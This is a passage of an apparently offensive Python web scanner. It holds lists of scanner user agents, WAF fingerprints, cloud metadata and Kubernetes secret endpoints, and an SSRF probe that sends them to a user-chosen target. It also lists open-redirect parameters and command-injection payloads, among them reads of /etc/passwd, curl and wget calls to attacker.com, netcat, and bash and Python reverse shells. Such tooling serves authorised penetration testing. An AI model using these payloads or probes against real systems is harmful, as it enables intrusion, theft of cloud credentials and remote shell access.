    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 14.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Nikto/2.1.6",
    "sqlmap/1.8.0.2#stable (https://sqlmap.org)",
    "Nmap Scripting Engine; https://nmap.org/book/nse.html",
    "masscan/1.3.2 (https://github.com/robertdavidgraham/masscan)",
    "nuclei - Community (https://github.com/projectdiscovery/nuclei)",
    "Burp Suite Professional/2024.2.1",
    "OWASP ZAP/2.14.0",
    "w3af/1.6.54",
    "Nessus/10.7.0",
    "OpenVAS Scanner/23.4.0",
    "Qualys Web Application Scanner",
    "Acunetix/14.0",
    "AppScan/10.0.0",
    "Rapid7 InsightAppSec",
    "Detectify Scanner",
    "dirbuster-2.0",
    "gobuster/3.6",
    "ffuf/2.1.0",
    "wfuzz/3.1.0",
    "feroxbuster/2.10.0",
    "dirsearch/0.4.3",
    "DirBuster-1.0-RC1",
    "whatweb/0.5.5",
    "WhatWeb/0.5.5",
    "Wappalyzer",
    "WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)",
    "WPScan v3.8.24",
    "CMSmap v1.0",
    "droopescan/1.46.1",
    "joomscan/2.0.0",
    "drupwn/1.1.1",
    "wafw00f/2.2.0",
    "LFISuite/1.14-2",
    "XSSer 1.8[4]",
    "XSStrike v3.1.5",
    "dalfox/2.9.1",
    "corsy/1.0",
    "403bypasser",
    "bypass-403/1.0",
    "SSRFmap/2.0",
    "Gopherus/1.1",
    "ysoserial/0.0.6",
    "deserlab/0.0.1",
    "java-deserialization-scanner",
    "Log4jHunter/1.0",
    "log4j-scan/1.0",
    "log4shell-scanner",
    "spring4shell-scanner",
    "ShellShock-Scanner",
    "Heartbleed-Scanner",
    "Metasploit/5.0.101",
    "python-httpx/0.27.0",
    "python-aiohttp/3.9.3",
    "urllib3/2.2.1",
    "httplib2/0.22.0",
    "mechanize/0.4.10",
    "scrapy/2.11.1",
    "playwright/1.43.0",
    "puppeteer/22.6.5",
    "selenium/4.19.0",
    "cypress/13.7.2",
    "testcafe/3.5.0",
    "k6/0.50.0",
    "Gatling/3.10.5",
    "JMeter/5.6.3",
    "locust/2.24.1",
    "artillery/2.0.19",
    "vegeta/12.11.1",
    "wrk/4.2.0",
    "ab/2.4.58",
    "siege/4.1.6",
    "hey/0.1.4",
    "autocannon/7.15.0",
    "SuperAgent/9.0.2",
    "RestSharp/110.2.0",
    "Unirest/3.0.0",
    "HttpFoundation/7.0.0",
    "GuzzleHttp/7.8.1",
    "Faraday/2.9.0",
    "HTTParty/0.22.0",
    "RestClient/2.1.0",
    "Retrofit/2.11.0",
    "Volley/1.2.1",
    "Alamofire/5.9.1",
    "AFNetworking/4.0.1",
    "nsurlsession/1.0",
    "CFNetwork/1490.0.4",
    "Darwin/23.5.0",
    "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8)",
    "okhttp/4.12.0",
    "Android-Browser/4.0",
    "Apache-HttpClient/4.5.14 (Java/17.0.9)",
    "jersey/3.1.5",
    "javax.ws.rs-client/3.1.5",
    "resteasy/6.2.7.Final",
    "CXF/4.0.4",
    "axis2/1.8.2",
    "com.android.volley/1.2.1",
    "Lagom/1.6.7",
    "Akka-Http/10.6.1",
    "http4s-ember-client/0.23.26",
    "ZIO-Http/3.0.0-RC8",
    "Ktor/2.3.9",
    "vertx/4.5.7",
    "Quarkus/3.9.5",
    "Micronaut/4.4.4",
    "Spring/6.1.6",
    "Helidon/4.0.10",
    "OpenLiberty/24.0.0.4",
    "WildFly/32.0.0.Final",
    "JBoss/7.4.16.GA",
    "TomEE/10.0.0",
    "Payara/6.2024.4",
    "Piranha/24.4.1",
    "TomcatAgent/10.1.20",
    "TomcatAgent/9.0.88",
    "AmazonAWS",
    "aws-sdk-java/2.25.23",
    "aws-sdk-python/1.34.84",
    "aws-sdk-go/1.51.21",
    "aws-sdk-js/2.1600.0",
    "aws-sdk-php/3.303.7",
    "aws-sdk-ruby/3.197.0",
    "aws-sdk-dotnet/3.7.905",
    "azure-sdk-for-python/1.29.0",
    "azure-sdk-for-java/1.2.14",
    "azure-sdk-for-go/68.0.0",
    "azure-sdk-for-js/1.0.0",
    "azure-sdk-for-net/1.0.0",
    "google-cloud-python/2.16.2",
    "google-cloud-java/1.0.0",
    "google-cloud-go/0.112.0",
    "google-auth/2.29.0",
    "google-api-python-client/2.125.0",
    "GoogleApiClientRequest/2.4.0",
    "cloudflare-python/3.5.0",
    "cloudflare-typescript/3.22.0",
    "cloudflare-go/v3",
    "stripe/14.8.0",
    "stripe-python/9.8.0",
    "stripe-ruby/12.4.0",
    "stripe-java/25.5.0",
    "stripe-php/16.0.0",
    "stripe-dotnet/46.1.0",
    "Twilio/.NET/7.2.2",
    "twilio-python/9.0.4",
    "twilio-ruby/7.1.1",
    "twilio-java/10.2.1",
    "twilio-php/8.2.0",
    "twilio-node/5.0.4",
    "Sendgrid/v4.0.0 (python)",
    "SendGrid/v7.7.0 (ruby)",
    "sendgrid-php/8.1.0",
    "mailchimp-marketing/1.0.0",
    "hubspot/8.0.0",
    "freshdesk/1.0.0",
    "zendesk/5.0.0",
    "intercom/5.0.0",
    "segment-analytics/6.0.0",
    "amplitude-analytics/1.9.2",
    "mixpanel-python/4.10.0",
    "datadog-agent/7.52.1",
    "newrelic/9.10.0 (Python 3.12.2)",
    "sentry-python/2.2.1",
    "rollbar/1.1.0",
    "bugsnag-python/4.7.1",
    "pagerduty-python/1.3.1",
    "opsgenie-sdk/2.1.5",
]

                                                                                 
                                    
                                                                                 

WAF_DETECTION_SIGNATURES = {
    "Cloudflare": {
        "headers":   ["CF-RAY","CF-Cache-Status","cf-request-id","__cfduid"],
        "cookies":   ["__cfduid","__cf_bm","cf_clearance"],
        "body":      ["Cloudflare","cloudflare","Attention Required","Error 1020",
                      "Error 1005","Error 1006","Error 1007","Error 1009",
                      "Error 1010","Error 1012","Error 1015","cloudflare-nginx"],
        "status":    [403,503],
    },
    "Akamai": {
        "headers":   ["X-Check-Cacheable","X-Akamai-Transformed","AkamaiGHost",
                      "X-Akamai-SSL-Client-Sid","X-Akamai-Request-ID",
                      "X-Cache","X-Cache-Remote","X-True-Cache-Key"],
        "cookies":   ["AkamaiBotManager_a2_0","bm_sz","bm_sv","abck","ak_bmsc"],
        "body":      ["Access Denied","Reference ID","akamai"],
        "status":    [403],
    },
    "Imperva/Incapsula": {
        "headers":   ["X-Iinfo","X-CDN"],
        "cookies":   ["incap_ses","visid_incap","reese84"],
        "body":      ["Incapsula","Blocked by Web Application Firewall",
                      "_Incapsula_Resource","incapsula"],
        "status":    [403],
    },
    "AWS WAF": {
        "headers":   ["X-AMZ-CF-POP","X-Amz-Cf-Id","x-amzn-requestid",
                      "x-amzn-errortype","x-amzn-trace-id"],
        "body":      ["AWS WAF","awswaf","Forbidden","Request blocked"],
        "status":    [403],
    },
    "ModSecurity": {
        "headers":   ["X-Powered-By-Plesk","Server: Apache","ModSecurity"],
        "body":      ["ModSecurity","mod_security","NOYB","Not Acceptable",
                      "406 Not Acceptable","Request Rejected"],
        "status":    [403,406],
    },
    "Sucuri": {
        "headers":   ["x-sucuri-id","x-sucuri-cache"],
        "body":      ["Sucuri CloudProxy","sucuri","Access Denied - Sucuri Website Firewall",
                      "CloudProxy"],
        "status":    [403,503],
    },
    "F5 BIG-IP ASM": {
        "headers":   ["X-Cnection","TS"],
        "cookies":   ["BIGipServer","TS"],
        "body":      ["BIG-IP","F5","the request was rejected",
                      "The requested URL was rejected"],
        "status":    [403,501],
    },
    "Barracuda": {
        "headers":   ["barra_counter_session"],
        "cookies":   ["barra_counter_session"],
        "body":      ["Barracuda Networks","barra","You are violating our terms"],
        "status":    [400,403,412],
    },
    "Citrix NetScaler": {
        "headers":   ["Via: NS-CACHE","X-Cache: NS-CACHE"],
        "cookies":   ["NSC_"],
        "body":      ["NetScaler","ns_error","netscaler"],
        "status":    [403],
    },
    "Fortinet FortiWeb": {
        "headers":   [],
        "cookies":   ["FORTIWAFSID"],
        "body":      ["FortiWeb","Fortigate","FortiGate","FortiWAF",
                      "Web Application Firewall (Fortigate)"],
        "status":    [403,412],
    },
    "Palo Alto": {
        "headers":   [],
        "cookies":   [],
        "body":      ["Palo Alto","PAN-OS","Transaction Rejected","has been blocked"],
        "status":    [400,403],
    },
    "DDoS-Guard": {
        "headers":   ["DDOS-Guard"],
        "cookies":   ["ddg1","ddg2","__ddgid","__ddg1","__ddg2"],
        "body":      ["DDoS-Guard","ddos-guard","ddosguard"],
        "status":    [403],
    },
    "Radware AppWall": {
        "headers":   ["X-SL-CompState"],
        "cookies":   ["Rdwr"],
        "body":      ["Radware","AppWall","rdwr","Unauthorized Activity"],
        "status":    [403],
    },
    "Reblaze": {
        "headers":   [],
        "cookies":   ["rbzid","rbzsessionid"],
        "body":      ["Reblaze","reblaze","Request Blocked"],
        "status":    [403],
    },
    "Wallarm": {
        "headers":   [],
        "cookies":   [],
        "body":      ["wallarm","Wallarm","NGWAF"],
        "status":    [403],
    },
    "Kona Site Defender (Akamai)": {
        "headers":   ["X-Check-Cacheable"],
        "cookies":   ["AkamaiGHost"],
        "body":      ["Reference ID","Kona","akamai"],
        "status":    [403],
    },
    "StackPath": {
        "headers":   ["X-ID"],
        "cookies":   [],
        "body":      ["StackPath","Blocked","stackpath"],
        "status":    [403],
    },
    "Fastly": {
        "headers":   ["X-Fastly-Request-ID","Fastly-Restarts","Surrogate-Key","Fastly-IO"],
        "cookies":   [],
        "body":      ["Fastly error","fastly","Requested URL cannot be delivered"],
        "status":    [403,503],
    },
    "Nginx WAF": {
        "headers":   ["Server: nginx"],
        "cookies":   [],
        "body":      ["nginx","Access denied","Request forbidden"],
        "status":    [403],
    },
    "Apache mod_security": {
        "headers":   ["Server: Apache"],
        "cookies":   [],
        "body":      ["Not Acceptable","406","mod_security","modsecurity"],
        "status":    [403,406],
    },
    "Comodo cWatch": {
        "headers":   [],
        "cookies":   [],
        "body":      ["comodo","cwatch","Comodo"],
        "status":    [403],
    },
    "SiteLock": {
        "headers":   [],
        "cookies":   [],
        "body":      ["SiteLock","sitelock","blocked by SiteLock"],
        "status":    [403],
    },
    "Wordfence": {
        "headers":   [],
        "cookies":   [],
        "body":      ["Wordfence","wordfence","generated by Wordfence",
                      "Your access to this site has been limited"],
        "status":    [403],
    },
    "WP Cerber": {
        "headers":   [],
        "cookies":   [],
        "body":      ["WP Cerber","cerber","Your request looks automated"],
        "status":    [403],
    },
    "iDefense Web Filtering": {
        "headers":   ["X-Powered-By-iDefense"],
        "cookies":   [],
        "body":      ["iDefense"],
        "status":    [403],
    },
    "IBM WebSphere DataPower": {
        "headers":   [],
        "cookies":   [],
        "body":      ["DataPower","IBM DataPower","Request Rejected"],
        "status":    [400,403,500],
    },
    "Oracle Cloud": {
        "headers":   ["X-Oracle-DMS-ECID","X-Oracle-DMS-RID"],
        "cookies":   [],
        "body":      ["Oracle","OracleWAF"],
        "status":    [403],
    },
    "Alibaba Cloud Shield": {
        "headers":   ["ali-cdn","x-swift-cachetime","x-swift-savetime","eagleeye-traceid"],
        "cookies":   [],
        "body":      ["Forbidden by Aliyun","alibaba","aliyun"],
        "status":    [403],
    },
    "Tencent Cloud WAF": {
        "headers":   ["X-Cache-Lookup","X-NWS-LOG-UUID","X-Daa-Tunnel"],
        "cookies":   [],
        "body":      ["腾讯","tencent","Tencent"],
        "status":    [403],
    },
    "Huawei Cloud WAF": {
        "headers":   ["X-HW-ID","X-HWAC","x-hw-id"],
        "cookies":   [],
        "body":      ["Huawei","HUAWEICLOUD"],
        "status":    [403],
    },
}

                                                                                 
                                      
                                                                                 

HTTP_STATUS_REFERENCE = {
    100: ("Continue","Informational — client should continue request"),
    101: ("Switching Protocols","Server switching protocols per Upgrade header"),
    102: ("Processing","WebDAV — request received, in progress"),
    103: ("Early Hints","Used with Link header to preload resources"),
    200: ("OK","Standard success response"),
    201: ("Created","Resource successfully created"),
    202: ("Accepted","Request accepted but not yet processed"),
    203: ("Non-Authoritative Information","Proxied response with modified headers"),
    204: ("No Content","Success, no response body"),
    205: ("Reset Content","Client should reset the document view"),
    206: ("Partial Content","Partial GET response — range request"),
    207: ("Multi-Status","WebDAV — response contains multiple status codes"),
    208: ("Already Reported","WebDAV — already enumerated in earlier 207"),
    226: ("IM Used","Instance manipulation applied"),
    300: ("Multiple Choices","Multiple representations available"),
    301: ("Moved Permanently","Resource permanently at new URL"),
    302: ("Found","Temporary redirect — common open redirect target"),
    303: ("See Other","Redirect to another URL, GET method"),
    304: ("Not Modified","Resource not changed since If-Modified-Since"),
    307: ("Temporary Redirect","Temporary redirect, preserves method"),
    308: ("Permanent Redirect","Permanent redirect, preserves method"),
    400: ("Bad Request","Malformed request syntax"),
    401: ("Unauthorized","Authentication required — check credentials"),
    402: ("Payment Required","Reserved, rarely used"),
    403: ("Forbidden","Authorization issue or WAF block — try bypass"),
    404: ("Not Found","Resource does not exist"),
    405: ("Method Not Allowed","HTTP method not allowed for endpoint"),
    406: ("Not Acceptable","Content negotiation failed — sometimes ModSecurity"),
    407: ("Proxy Authentication Required","Proxy auth needed"),
    408: ("Request Timeout","Server timed out waiting for request"),
    409: ("Conflict","Request conflicts with server state"),
    410: ("Gone","Resource permanently removed"),
    411: ("Length Required","Content-Length header required"),
    412: ("Precondition Failed","Precondition in headers not met — sometimes Barracuda WAF"),
    413: ("Payload Too Large","Request body too large — upload size limit"),
    414: ("URI Too Long","URL exceeds server limit"),
    415: ("Unsupported Media Type","Content-Type not accepted"),
    416: ("Range Not Satisfiable","Range header cannot be satisfied"),
    417: ("Expectation Failed","Expect header not met"),
    418: ("I'm a Teapot","RFC 2324 — Hyper Text Coffee Pot"),
    421: ("Misdirected Request","Request sent to wrong server"),
    422: ("Unprocessable Entity","Semantic error in request body"),
    423: ("Locked","WebDAV — resource is locked"),
    424: ("Failed Dependency","WebDAV — dependency failed"),
    425: ("Too Early","Request may be replayed (Early Data)"),
    426: ("Upgrade Required","Client must upgrade protocol"),
    428: ("Precondition Required","Conditional request required"),
    429: ("Too Many Requests","Rate limited — reduce request rate"),
    431: ("Request Header Fields Too Large","Headers too large"),
    451: ("Unavailable For Legal Reasons","Content removed for legal reasons"),
    500: ("Internal Server Error","Server error — check for stack trace leakage"),
    501: ("Not Implemented","Server does not support the request method"),
    502: ("Bad Gateway","Invalid response from upstream"),
    503: ("Service Unavailable","Server temporarily unavailable — often maintenance"),
    504: ("Gateway Timeout","Upstream server timeout"),
    505: ("HTTP Version Not Supported","HTTP version not supported"),
    506: ("Variant Also Negotiates","Content negotiation loop"),
    507: ("Insufficient Storage","WebDAV — server storage full"),
    508: ("Loop Detected","WebDAV — infinite loop detected"),
    510: ("Not Extended","Extension required but not available"),
    511: ("Network Authentication Required","Must authenticate to network"),
}


def print_http_status_ref():
    _banner()
    print(f"{BLU}\n  HTTP STATUS CODE REFERENCE\n{RST}")
    for code, (name, desc) in sorted(HTTP_STATUS_REFERENCE.items()):
        if code < 200:
            col = DIM
        elif code < 300:
            col = GRN
        elif code < 400:
            col = CYN
        elif code < 500:
            col = YLW
        else:
            col = RED
        print(f"  {col}{BLD}{code}{RST}  {PUR}{name:<30}{RST}  {DIM}{desc}{RST}")
    _pause()


                                                                                 
                                                                       
                                                                                 

CLOUD_METADATA_ENDPOINTS = {
    "AWS": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/ami-id",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://169.254.169.254/latest/meta-data/instance-type",
        "http://169.254.169.254/latest/meta-data/local-ipv4",
        "http://169.254.169.254/latest/meta-data/public-ipv4",
        "http://169.254.169.254/latest/meta-data/public-hostname",
        "http://169.254.169.254/latest/meta-data/security-groups",
        "http://169.254.169.254/latest/meta-data/iam/",
        "http://169.254.169.254/latest/meta-data/iam/info",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/network/interfaces/",
        "http://169.254.169.254/latest/meta-data/placement/availability-zone",
        "http://169.254.169.254/latest/meta-data/placement/region",
        "http://169.254.169.254/latest/meta-data/public-keys/",
        "http://169.254.169.254/latest/meta-data/reservation-id",
        "http://169.254.169.254/latest/meta-data/services/domain",
        "http://169.254.169.254/latest/meta-data/services/endpoints",
        "http://169.254.169.254/latest/meta-data/tags/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "http://169.254.169.254/latest/dynamic/instance-identity/signature",
        "http://169.254.169.254/latest/dynamic/instance-identity/pkcs7",
        "http://169.254.169.254/latest/api/token",
        "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
    ],
    "GCP": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/project/",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id",
        "http://metadata.google.internal/computeMetadata/v1/project/attributes/",
        "http://metadata.google.internal/computeMetadata/v1/instance/",
        "http://metadata.google.internal/computeMetadata/v1/instance/id",
        "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
        "http://metadata.google.internal/computeMetadata/v1/instance/zone",
        "http://metadata.google.internal/computeMetadata/v1/instance/machine-type",
        "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/",
        "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/instance/tags",
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys",
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env",
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script",
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/shutdown-script",
        "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/",
        "http://metadata.google.internal/0.1/meta-data/",
    ],
    "Azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
        "http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01&format=text",
        "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text",
        "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text",
        "http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01&format=text",
        "http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01&format=text",
        "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
        "http://169.254.169.254/metadata/instance/network/interface?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/",
        "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01",
        "http://169.254.169.254/metadata/scheduledevents?api-version=2019-01-01",
        "http://169.254.169.254/metadata/loadbalancer?api-version=2020-10-01",
    ],
    "DigitalOcean": [
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1/id",
        "http://169.254.169.254/metadata/v1/hostname",
        "http://169.254.169.254/metadata/v1/region",
        "http://169.254.169.254/metadata/v1/interfaces/",
        "http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address",
        "http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address",
        "http://169.254.169.254/metadata/v1/dns/nameservers",
        "http://169.254.169.254/metadata/v1/tags",
        "http://169.254.169.254/metadata/v1/user-data",
        "http://169.254.169.254/metadata/v1/vendor-data",
        "http://169.254.169.254/metadata/v1/floating_ip/ipv4/active",
        "http://169.254.169.254/metadata/v1/floating_ip/ipv4/ip_address",
    ],
    "Alibaba": [
        "http://100.100.100.200/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/instance-id",
        "http://100.100.100.200/latest/meta-data/hostname",
        "http://100.100.100.200/latest/meta-data/public-ipv4",
        "http://100.100.100.200/latest/meta-data/private-ipv4",
        "http://100.100.100.200/latest/meta-data/region-id",
        "http://100.100.100.200/latest/meta-data/zone-id",
        "http://100.100.100.200/latest/meta-data/image-id",
        "http://100.100.100.200/latest/meta-data/instance/instance-type",
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        "http://100.100.100.200/latest/user-data",
    ],
    "Oracle Cloud": [
        "http://169.254.169.254/opc/v2/instance/",
        "http://169.254.169.254/opc/v2/instance/id",
        "http://169.254.169.254/opc/v2/instance/displayName",
        "http://169.254.169.254/opc/v2/instance/region",
        "http://169.254.169.254/opc/v2/instance/availabilityDomain",
        "http://169.254.169.254/opc/v2/instance/vnics/",
        "http://169.254.169.254/opc/v2/instance/metadata/",
        "http://169.254.169.254/opc/v1/instance/",
    ],
    "Kubernetes": [
        "https://kubernetes.default.svc/api/",
        "https://kubernetes.default.svc/api/v1/",
        "https://kubernetes.default.svc/api/v1/namespaces/",
        "https://kubernetes.default.svc/api/v1/secrets/",
        "https://kubernetes.default.svc/api/v1/pods/",
        "https://kubernetes.default.svc/api/v1/nodes/",
        "https://kubernetes.default.svc/api/v1/services/",
        "https://kubernetes.default.svc/api/v1/configmaps/",
        "https://kubernetes.default.svc/apis/",
        "https://kubernetes.default.svc/version",
        "https://kubernetes.default.svc/healthz",
        "http://kube-apiserver:8080/api/v1/",
        "http://10.96.0.1/api/v1/",
        "http://10.0.0.1:8080/api/v1/",
        "http://10.0.0.1:8001/api/v1/",
        "http://localhost:8080/api/v1/",
        "http://localhost:10255/pods",
        "http://localhost:10255/metrics",
        "http://localhost:2379/v2/keys/",
        "http://localhost:4001/v2/keys/",
        "http://localhost:8001/api/v1/",
        "http://localhost:8001/api/v1/secrets/",
        "http://localhost:8001/api/v1/namespaces/kube-system/secrets/",
    ],
}


def check_cloud_metadata(url=None):
    _banner()
    _info("Cloud Metadata SSRF Probe")
    target = url or _ask("target-url").strip()
    if not target:
        _pause()
        return
    base = normalize_base(target)

    for provider, endpoints in CLOUD_METADATA_ENDPOINTS.items():
        print(BLU + f"\n  [{provider}]" + RST)
        for ep in endpoints[:5]:
            params_to_try = [
                ("url", ep), ("path", ep), ("redirect", ep),
                ("next", ep), ("callback", ep), ("host", ep),
                ("endpoint", ep), ("uri", ep), ("location", ep),
                ("link", ep), ("src", ep), ("target", ep),
                ("dest", ep), ("destination", ep), ("proxy", ep),
            ]
            for param, val in params_to_try[:3]:
                r = retry_get(f"{base}?{param}={val}", timeout=5)
                if r and r.status_code == 200 and len(r.text) > 50:
                    if any(kw in r.text for kw in
                           ["instance-id","ami-id","project-id","subscriptionId",
                            "vmId","hostname","region","availability"]):
                        _vuln(f"  POSSIBLE SSRF → {ep} via ?{param}=")
                        _add_finding(
                            "CRITICAL","SSRF → Cloud Metadata",
                            f"{base}?{param}={val}",
                            f"SSRF reached cloud metadata: {provider}",
                            r.text[:200],
                            "Block access to 169.254.169.254 and metadata endpoints",
                            "SSRF"
                        )
                        break
    _pause()


                                                                                 
                                                            
                                                                                 

OPEN_REDIRECT_PARAMS_EXTENDED = [
    "url","redirect","redirect_url","redirect_uri","redirect_to",
    "return","return_url","return_to","returnurl","returnto",
    "return_path","returnPath","return_path_on_error",
    "next","next_url","nexturl","next_page","nextPage",
    "continue","continue_url","continueurl","continueto",
    "forward","forward_url","forwardurl","forwardto",
    "dest","destination","dest_url","desturl","destination_url",
    "target","target_url","targeturl","targetpath",
    "goto","gotourl","go","go_url","gourl",
    "link","linkurl","link_url","link_path",
    "callback","callback_url","callbackurl","callbackuri",
    "ref","referer","referrer","ref_url","refurl",
    "path","path_url","pathurl","location","locationurl",
    "site","siteurl","site_url","domain","domainurl",
    "host","hosturl","host_url","hostname","hostpath",
    "uri","uri_url","uriurl","uripath",
    "jump","jump_url","jumpurl","jumpto",
    "redir","redir_url","redirurl","redirto",
    "rurl","r","u","q","out","out_url","outurl",
    "view","view_url","viewurl","page","pageurl",
    "file","file_url","fileurl","filepath","file_path",
    "img","img_url","imgurl","image","image_url","imageurl",
    "src","source","source_url","sourceurl","sourceuri",
    "endpoint","endpoint_url","endpointurl","endpointpath",
    "service","service_url","serviceurl","servicepath",
    "checkout","checkout_url","checkouturl","checkoutpath",
    "success","success_url","successurl","success_path",
    "failure","failure_url","failureurl","failure_path",
    "cancel","cancel_url","cancelurl","cancel_path",
    "error","error_url","errorurl","error_path",
    "login","login_url","loginurl","login_redirect",
    "logout","logout_url","logouturl","logout_redirect",
    "auth","auth_url","authurl","auth_redirect","auth_return",
    "oauth","oauth_callback","oauth_redirect","oauth_return",
    "sso","sso_callback","sso_redirect","sso_return",
    "back","back_url","backurl","back_path","backpath",
    "prev","prev_url","prevurl","prev_page","prevpage",
    "to","tourl","to_url","from","from_url","fromurl",
    "load","load_url","loadurl","open","open_url","openurl",
    "window","window_url","windowurl","pop","pop_url","popup",
    "after","after_url","afterurl","after_login","after_logout",
    "before","before_url","beforeurl","before_login",
    "on_success","on_failure","on_error","on_cancel",
    "onsuccess","onfailure","onerror","oncancel",
    "final","final_url","finalurl","finalpath",
    "origin","origin_url","originurl","origin_path",
    "exit","exit_url","exiturl","exitpath",
    "checkout_url","payment_return","payment_cancel",
    "landing","landing_url","landingurl","landingpage",
    "share","share_url","shareurl","sharelink",
    "invite","invite_url","inviteurl","invite_redirect",
    "activation","activation_url","confirm","confirm_url",
    "verify","verify_url","verifyurl","verify_redirect",
    "signup","signup_url","signupurl","signup_redirect",
    "welcome","welcome_url","welcomeurl","welcome_redirect",
    "onboarding","onboarding_url","onboarding_redirect",
    "dashboard","dashboard_url","dashboardurl","home","home_url",
    "profile","profile_url","profileurl","account","account_url",
    "settings","settings_url","settingsurl","config_url",
    "download","download_url","downloadurl","file_download",
    "upload","upload_url","uploadurl","file_upload",
    "redirect_after_login","redirect_after_logout",
    "redirect_after_signup","redirect_after_verify",
    "redirect_after_reset","redirect_after_confirm",
    "redirect_after_payment","redirect_after_checkout",
]


                                                                                 
                                      
                                                                                 

EXTENDED_CMDI_PAYLOADS = [
    "; id","; whoami","; uname -a","; cat /etc/passwd","; ls -la",
    "| id","| whoami","| uname -a","| cat /etc/passwd","| ls -la",
    "& id","& whoami","& uname -a","& cat /etc/passwd","& ls -la",
    "&& id","&& whoami","&& uname -a","&& cat /etc/passwd",
    "|| id","|| whoami","|| uname -a","|| cat /etc/passwd",
    "$(id)","$(whoami)","$(uname -a)","$(cat /etc/passwd)",
    "`id`","`whoami`","`uname -a`","`cat /etc/passwd`",
    "; sleep 5","; sleep 10","; sleep 15","| sleep 5","& sleep 5",
    "&& sleep 5","|| sleep 5","$(sleep 5)","`sleep 5`",
    "; ping -c 5 127.0.0.1","| ping -c 5 127.0.0.1",
    "& ping -c 5 127.0.0.1","&& ping -c 5 127.0.0.1",
    "$(ping -c 5 127.0.0.1)","`ping -c 5 127.0.0.1`",
    "; nslookup attacker.com","| nslookup attacker.com",
    "& nslookup attacker.com","&& nslookup attacker.com",
    "$(nslookup attacker.com)","`nslookup attacker.com`",
    "; curl http://attacker.com/","| curl http://attacker.com/",
    "& curl http://attacker.com/","&& curl http://attacker.com/",
    "$(curl http://attacker.com/)","`curl http://attacker.com/`",
    "; wget http://attacker.com/","| wget http://attacker.com/",
    "; nc -e /bin/sh attacker.com 4444",
    "| nc -e /bin/sh attacker.com 4444",
    "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    "; python3 -c \"import os,pty,socket;s=socket.socket();s.connect(('attacker.com',4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('sh')\"",
    "test; id",
    "test | id",
    "test & id",
    "test && id",
    "test || id",
    "1;id",
    "1|id",
    "1&id",
    "1&&id",
    "1||id",
    "1$(id)",
    "1`id`",
    "a;id",
    "a|id",
    "a&id",
    "a&&id",
    "a||id",
    "a$(id)",
    "a`id`",
    "\";id#",
    "';id#",
    "\";id;\"",
    "';id;'",
    "\"||id#",
    "'||id#",
    "\"&&id#",
    "'&&id#",
    "cmd /c id",
    "cmd /c whoami",
    "cmd /c ver",
    "cmd /c dir",
    "cmd /c set",
    "cmd.exe /c id",
    "cmd.exe /c whoami",
